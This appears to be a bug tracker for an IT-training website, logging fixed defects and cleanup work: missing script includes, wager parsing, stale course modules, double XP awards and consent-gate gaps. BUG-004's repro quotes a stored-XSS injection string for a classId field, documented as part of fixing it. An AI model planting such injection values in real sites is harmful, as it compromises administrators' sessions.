- **DONE 2026-07-22 (item 22 — dead CSS removed):** removed 18 provably-dead CSS classes + orphan `@keyframes pulse` from cloud-iam-debugger (`.json-key/-string/-number/-boolean/-bracket`, `.problem-highlight`, `.fix-options/-option(+.selected/.correct/.incorrect/:hover)/-label/-code`, `.diff-add/-remove`, `.pulse`, `.timer-bar/-fill` — leftovers from removed features). 5 regions, 131 deletions / 0 insertions (removal-only). Verified: grep sweep 0 remaining refs (no orphan comments), CSS braces balanced (63/63), live `@keyframes iamStatPulse`/`slideIn` untouched, and the game's own harness `_tools/arcade-fixes/iam-debugger-check.js` PASSES (all 10 rounds grade, game completable, XP once, 0 console errors) — which also re-confirms item 24's Round-8 null-check end-to-end. Nancy PROCEED (confirmed zero dynamic class construction anywhere + zero external consumers), Chris PASS (independently reproduced every check). **DEPLOYED live 2026-07-22** (`8315db0ae`); post-verify 5/5 green; live-verified 0 dead refs remain, live `@keyframes iamStatPulse`/`slideIn` intact, HTTP 200. (Nancy noted a SEPARATE out-of-scope smell: duplicate `.back-link` blocks where the 2nd `:hover` color shadows the 1st — not fixed here; could be a future micro-cleanup.)
- **BACKLOG CLOSED 2026-07-22:** the div-tag-mismatch finding (`html-div-mismatch-finding-2026-05-09.md`, orig. 27 files) is now fully resolved — a fresh `<div>`-balance scan of all 5,181 `_app` HTML files run through the real EduScan validator shows **0 real HTML-011/012 remaining** (the 5 raw-count imbalances left are JS-template/string artifacts, validator-CLEAN). The 6 cyberops files above were the last real ones.
- STILL OPEN: forge-troubleshooting-scenarios pill objective numbers vs corrected headers (item 1 — needs official CompTIA A+ objectives as ground truth; header/pill numbers are genuinely wrong, not just inconsistent) · Game Forge `mapJeopardy` drops `accepts` on re-run (item 27 — not in hosting tree, `_tools` concern) · LinuxTerminal root home `/home/root` vs `/root`, no grading impact (item 13) · LinuxTerminal `_cp` partial-copy + `_mv`/`_cp` leading-flag strip, bash-borderline, zero live exposure (items 37,38).

---

## Resolved

### BUG-037 -- 8 house pages render an EMPTY Courses grid: cartridge-fy shipped without the HubRegistry include  ·  P1  ·  resolved
- **Found:** 2026-07-28 · by self (verified by Nancy) · during north-star step-1 build, tracing how the forge precedent loads HubRegistry
- **Area:** _app/houses/{cloud,code,dark-arts,eye,forge,key,script,shield}/index.html -- `cardStyle: 'cartridge'` + registry-id string `paths`, but NO `<script src="../../components/HubRegistry.js">` on the page
- **Symptom:** for every sorted student, the Learning Paths tab shows a "COURSES" heading over an empty grid (and House Content's "Course Hubs" section is likewise empty): `hrResolveCartridge`'s guard `(window.HubRegistry && HubRegistry.all) ? HubRegistry.all() : []` silently skips every string entry when the registry global is absent.
- **Repro:** puppeteer against https://hexworth.com/houses/forge/ with `hexworth_house` pre-seeded (sorted user): `typeof window.HubRegistry === 'undefined'`, `document.querySelectorAll('.hr-cart').length === 0`, paths panel innerHTML 156 chars.
- **Root cause:** ec74ee454 (cartridge-fy 8 house pages) converted `config.paths` to registry-id strings on exactly these 8 pages but never added the script include the new code path depends on; observatory (which had the include already) was the QC reference, so the gap wasn't caught. Same failure class as the plan's Concern 4: mechanism not traced end-to-end.
- **Fix:** this commit -- one `<script src="../../components/HubRegistry.js"></script>` line per page, immediately before HouseRenderer.js (observatory's proven pattern). Verified locally: all 9 cartridge pages (8 + new ai) render with HubRegistry defined and correct cartridge counts (2x config length across the two tabs, by design).
- **Verified:** local puppeteer render-verify 9/9 PASS; deployed b92534ad7 2026-07-28 (all gates + post-verify PASSED); LIVE re-verify vs hexworth.com 9/9 PASS as sorted user (all grids populated; ai = 8 projected hubs + 3 preserved paths x2 tabs; path-view click-through renders).
- **Related:** north-star step 1; Nancy PROCEED on addendum 2026-07-28.

### BUG-033 — Jeopardy Daily Double wager silently becomes $5 on any non-pure-digit input  ·  P1  ·  resolved
- **Found:** 2026-07-27 · by user (Frank, live A+ Core 1 class session) · in Review Games / Jeopardy engine
- **Area:** _app/_games-lab/jeopardy.html:976-994 `submitDailyDoubleWager()` (shared engine, all 18 courses)
- **Symptom:** Player types a wager; if the value is not a pure integer string (decimal "350.5", cleared/empty field, "5e2", "$500", "1,000"), the bet silently becomes $5. Scoring then pays/deducts $5, not the intended wager — "the bet amount did not process properly" in class.
- **Repro:** headless vs LIVE hexworth.com, forced DD: "350.5"→$5, ""→$5, "5e2"→$5 (integers and over-max clamp behave correctly). Script: scratchpad/dd-math-repro.js.
- **Root cause:** wager parsed with `/^\d+$/` gate and a blanket `wager = 5` fallback for anything that fails it.
- **Fix:** 57aeb3e69 (shared engine, deployed + live-verified 6/6) + e1eb3a825 (eth/pis/ala standalone pages, deployed + live-verified 24/24) — strip $/commas/spaces, `Math.floor(Number(...))`, reject unparseable/below-$5 input (wager UI held open, field flagged red — no silent bet; NaN cannot reach scoring), over-max clamps to cap. Both commits also deliver 2 Daily Doubles per board in distinct categories (Frank ruling). Taskboard #227 complete.
- **Verified:** live hexworth.com headless playthroughs — engine: 2 runs x exactly-2-DDs distinct cats, 350.5 bets $350, empty held+flagged; standalone pages: 24/24 incl eth reject/retry/void/Escape sequences. Chris platform-completeness grep: no other file carries this wager mechanic (ReviewEngine Final-Jeopardy all-in is input-free, different mechanic).
- **Related:** secondary UX debt found in same repro: locking a wager then closing the modal silently voided the wager. RULED + FIXED 2026-07-27 (Frank: "make the daily double unclosable after the wager is locked") — commit 5e3fa5ec2, all 4 games: X hidden + Escape/backdrop dead while locked; exits = judge or Reset Board; pre-wager splash close unchanged. Live-verified 30/30.
- **SCOPE CAVEAT (Chris QC catch, 2026-07-27):** the games-lab engine fix does NOT cover three standalone review-game pages that carry their own independent copies of the same defect class (single DD + silent $5-substitute wager fallback), all live and linked from their course pages ("Play" buttons):
  - `_app/houses/divergent/ethics-it/exams/eth-jeopardy.review.html` (~913-923) — linked from `houses/divergent/ethics-it/index.html:2117`
  - `_app/houses/shield/infosec/exams/pis-jeopardy.review.html` (~789-799, ~990-992) — linked from `houses/shield/infosec/index.html:2094`
  - `_app/houses/matrix/adv-linux/exams/ala-jeopardy.review.html` (~811-821, ~993-998) — linked from `houses/matrix/adv-linux/index.html:2201`
  Running Jeopardy review in Ethics/PIS/ALA hits the identical "bet didn't process" failure until these are patched (NOW DONE — e1eb3a825). **Frank RULED 2026-07-27: "option 1 ship it now then fix the other three"** — engine bundle deploys first; the three standalone pages get the same 2-DD + wager-parse fix as the IMMEDIATE next work item (taskboard task, each page individually tested + QC'd). (forge-aplus-jeopardy.applet.html checked: NO DD/wager mechanic — unaffected.)


### BUG-013 — `azure-fundamentals` LearningPath renders a stale legacy curriculum (twin of the aws-ccp bug)  ·  P3  ·  resolved (deployed 2026-07-23 `d57a4f243`; live-verified)
- **Found:** 2026-07-22 · by Nancy · during CLF-C02 course-build review
- **Area:** `_app/components/LearningPaths.js` `'azure-fundamentals'` path `.modules` array + `_app/houses/cloud/index.html:113` paths-card (no explicit `href`)
- **Symptom:** the `azure-fundamentals` path's `modules` array is still the old scattered `cloud-concepts`/`cloud-models`/`cloud-ch0X-*.tool` list, NOT the real `az900-ch0X-*` chapter modules. Its cloud-hub paths-card has no `href`, so it falls through to `path-view.html?...azure-fundamentals` and renders that stale checklist — a disconnected curriculum under the "Azure Fundamentals" name, parallel to the real AZ-900 course (`az-900/index.html`).
- **Root cause:** same as the aws-ccp bug fixed during the CLF-C02 build (2026-07-22) — the LearningPath `.modules` arrays predate the dedicated `az-900/` course dir and were never repointed. AZ-900 predates the CLF-C02 work so it was left out of scope.
- **Fix (applied 2026-07-23):** mirrored the aws-ccp fix — replaced `azure-fundamentals.modules` (14 stale modules) with the 9 real `az900-ch0{1,2,3}-{pres,lab,quiz}` modules (hrefs into `houses/cloud/az-900/...`), prerequisite-chained, Ch03 title "Management and Governance" matching the hub verbatim. `courseHref` was already correct. ONE file changed (`LearningPaths.js`). No `cloud/index.html` change needed: the paths-card renders correctly through `path-view.html` once the modules array is real (same as aws-ccp), and a separate direct AZ-900 course card already exists (`cloud/index.html:178`). Nancy PROCEED, Chris PASS.
- **Verified:** 2026-07-23 · shipped in the 01:11 `./deploy.sh` run (evidence: Firebase hosting cache + Nexus post-verify `findings.json` both written 01:11; Chris-gate record `_tools/deploy/.chris-pass` = HEAD `f4f2dead5`, verdict PASS). Production `LearningPaths.js` curl-confirmed to contain all 9 `az900-ch0{1,2,3}-{pres,lab,quiz}` module ids; independently re-confirmed by Nancy during the tracker-update review.
- **Side benefit (Nancy):** also resolves a pre-existing cross-path id collision — `cse-01-fundamentals` and `cse-02-iam` existed verbatim in BOTH this path and the separate `'cse'` LearningPath (`LearningPaths.js:3139`); `path-view.html`'s flat completion Set bled state between them. Removing them here ends that bleed.
- **FOLLOW-UP:** the `'cse'` dark-path expose-or-remove decision was split out as **BUG-014** (open) at resolution time. Also: `_app/houses/azure-fundamentals/index.html` (orphaned from live nav, only referenced by an archived router) reads this same array via `CertPathRenderer` and incidentally benefits from the fix.
- **Related:** the aws-ccp equivalent was fixed in the CLF-C02 build (`b7440b426`). BUG-014. Cloud QC campaign [[project]] candidate.

### BUG-007 — Double-XP: `trackProgress:true` + `onComplete→completeQuiz` double-award  ·  P2  ·  resolved (deployed 2026-07-21, `227dfcf7d`; Chris live-verified single write; residuals operator-accepted: silent banner + no backfill)
- **Fix:** `aa09e7106` — `trackProgress:false` on `dark-arts-ceh-01.quiz.html`. Nancy CONFIRMED the XP-amount double-award is fully closed (all 3 completion gates `QuizEngine.js:419,548,582` check trackProgress; 0/390 other quizzes share the pattern; no `ceh-01`-keyed reader). **Deploy held on operator decisions below.**
- **RESIDUAL 1 (operator decision) — silent XP banner:** with trackProgress:false, `progressResult` is null so the results-screen "+N XP earned" banner no longer renders on this quiz (XP still awarded + shown on dashboard). Restoring it needs a shared-QuizEngine change (feed banner from completeQuiz's award) — disproportionate for 1 quiz. REC: accept silent on this one quiz. Operator call.
- **RESIDUAL 2 (operator decision) — historical inflation:** students who passed pre-fix have `modulesCompleted` with 2 entries for 1 completion (feeds milestone triggers `ProgressManager.js:786` + counts `:952`), permanent unless backfilled. Scope: only this 1 quiz's passers, +1 module count each. REC: document (here), no backfill migration for one quiz's +1. Operator call.
- **Found:** 2026-07-15 (surfaced), verified-down 2026-07-21 · by self · in marathon Lane-A item 3
- **Area:** `_app/components/QuizEngine.js:419` (trackQuizCompletion awards via ProgressManager) + page `onComplete` that calls `completeQuiz()`
- **Symptom:** a quiz can award XP twice — once via the engine's `trackProgress` path, once via a page `onComplete` that calls `completeQuiz`. Inflates the XP/evidence layer.
- **Repro:** load a quiz whose config has `trackProgress:true` AND an `onComplete` that calls `completeQuiz`, pass it → XP awarded on both paths.
- **Root cause:** two independent completion→XP paths not de-duplicated.
- **Verify-first result (2026-07-21):** NOT platform-wide. Only **1 file** literally co-occurs `trackProgress:true` + `completeQuiz()`; the other 392 `trackProgress:true` quizzes use the single-award path. Down-scoped from "platform-wide" to a 1-file fix + an engine-level guard question (should the engine de-dupe if both fire?).
- **Related:** marathon backlog [2026-07-15].


### BUG-006 — Stray QC temp file `chris_qc_tile_grid_tmp.html` deployed live to prod  ·  P3  ·  resolved
- **Found:** 2026-07-21 · by self · in Sextant marathon (hosting deploy)
- **Area:** `_app/chris_qc_tile_grid_tmp.html` (was live at hexworth.com/chris_qc_tile_grid_tmp.html, HTTP 200)
- **Symptom:** an earlier QC agent left a scratch HTML inside `_app/`; a hosting deploy pushed it live. Firebase Hosting deploys the whole `_app` dir, tracked or not.
- **Root cause:** QC agents write scratch files into the served dir instead of scratchpad.
- **Fix:** removed from `_app` (archived to scratchpad); drops from prod on next hosting deploy. **Verified:** self (curl was 200, file removed). **Related:** hygiene — QC agents should write to scratchpad, never `_app/` or repo root.

### BUG-005 — Sextant consent gate read only one collection (weaker than telemetry CF)  ·  P1  ·  resolved
- **Found:** 2026-07-21 · by Nancy · in Sextant Stage 1
- **Area:** `functions/sextant.js` `loadConsentedLearners`
- **Symptom:** snapshot decline-gate checked `participates` on `observatory_enrollment` only; the telemetry CF checks BOTH enrollment AND consent (OR). A future one-doc desync would silently archive a declined learner weekly.
- **Fix:** `539cc0334`-lineage — gate now excludes iff `participates===false` on EITHER doc. **Verified:** Chris (mock-Firestore, declined-via-consent-only excluded). **Related:** BUG-001.

### BUG-004 — Stored XSS via user-writable `classId` in the cohort reader  ·  P1  ·  resolved
- **Found:** 2026-07-21 · by Nancy · in Sextant Stage 2
- **Area:** `_app/admin/sextant-cohorts.html` (cohort toggle build)
- **Symptom:** `classId` (a field any learner writes on their own `observatory_enrollment`, no server validation) was injected into an admin page via `innerHTML` → stored XSS in an admin session.
- **Repro:** learner sets `classId` = `"><img src=x onerror=...>`; admin opens cohort reader (needs ≥5 such learners to pass k-anon).
- **Root cause:** `innerHTML` template-literal build of user-controlled data.
- **Fix:** `539cc0334` — toggles built via DOM `createElement`/`createTextNode`; classId never HTML-parsed. **Verified:** Chris (live payload → `window.__XSS__` undefined, literal text, no injected `<img>`).

### BUG-003 — `purgeLearner` silent no-op on missing pepper broke right-to-withdraw  ·  P1  ·  resolved
- **Found:** 2026-07-21 · by Nancy · in Sextant Stage 1
- **Area:** `functions/sextant.js` `purgeLearner`
- **Symptom:** if the pepper was unavailable at withdrawal time, purge returned 0 silently while real Plane-B data existed → learner told "deleted" but wasn't.
- **Fix:** `90ea32071` — purge fails loud on missing pepper; withdrawal records `sextantPurged:false`; `reconcileWithdrawals` drains the queue on the next snapshot. **Verified:** Chris + self (throws on null pepper; reconcile drains + isolates per-learner failure). **Related:** BUG-001.

### BUG-002 — `getMyTrajectory` unordered `.limit()` silently corrupted trajectories  ·  P1  ·  resolved
- **Found:** 2026-07-21 · by Nancy · in Sextant Stage 1
- **Area:** `functions/index.js` `getMyTrajectory`
- **Symptom:** `.where('uid'==).limit(20000)` with no `orderBy` returns an arbitrary subset for a >20k-event learner → wrong weekly buckets/velocity, no indication.
- **Fix:** `90ea32071` — added `.orderBy('at','desc')` (truncates oldest, not arbitrary) + composite index + `truncated` flag. **Verified:** Chris.

### BUG-001 — Withdrawal didn't purge Sextant data (right-to-withdraw hole)  ·  P1  ·  resolved
- **Found:** 2026-07-21 · by Nancy · in Sextant Stage 1
- **Area:** `functions/index.js` `withdrawFromObservatory`
- **Symptom:** the new Sextant stores (Plane A/B) weren't known to the withdrawal path → a withdrawn learner's tokenized cohort data survived forever, admin-reversible with the pepper.
- **Fix:** `8283e22d9` → design-D pivot removed Plane A entirely (self-view derived live from activity, which withdrawal already deletes) + `purgeLearner` deletes Plane B by token. **Verified:** Chris + self. **Related:** BUG-003, BUG-005.

---

*Started 2026-07-21, seeded from the Sextant marathon QC catches. Log every human-found bug here as it's found.*
